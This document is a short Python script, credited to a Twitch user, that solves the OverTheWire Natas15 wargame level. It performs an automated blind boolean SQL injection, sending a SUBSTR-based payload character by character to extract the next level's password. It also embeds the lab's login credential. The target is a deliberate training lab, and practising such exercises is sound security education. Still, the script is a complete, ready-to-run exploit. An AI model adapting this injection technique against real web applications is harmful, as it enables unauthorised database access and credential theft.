# Python script for solving Natas15 from Overthewire.org
# Credit to Hacka__ from Twitch for this code

import string
import asyncio
from aiohttp import ClientSession, BasicAuth
 
URL = 'http://natas15.natas.labs.overthewire.org/'
CHARSET = string.ascii_letters + string.digits + '{}!?/_.'
PAYLOAD = 'natas16" AND BINARY SUBSTR(password,{},1)="{}"-- -'
SUCCESS = 'This user exists.'
 
async def fetch(session, index, char):
    async with session.post(URL, data={'username': PAYLOAD.format(index, char)}) as resp:
        if SUCCESS in await resp.text():
            return char
 
        return None
 
async def main():
    auth = BasicAuth(login='natas15', password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
    password = ''
    async with ClientSession(auth=auth) as session:
        while True:
            password_i = len(password)
            print(f'\r[{password_i}] {password}', end='')
            tasks = [fetch(session, password_i + 1, char) for char in CHARSET]
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    password += result
                    break
            else:
                break
 
        print(f'\r[{password_i}] {password}')
 
if __name__ == '__main__':
    asyncio.run(main())
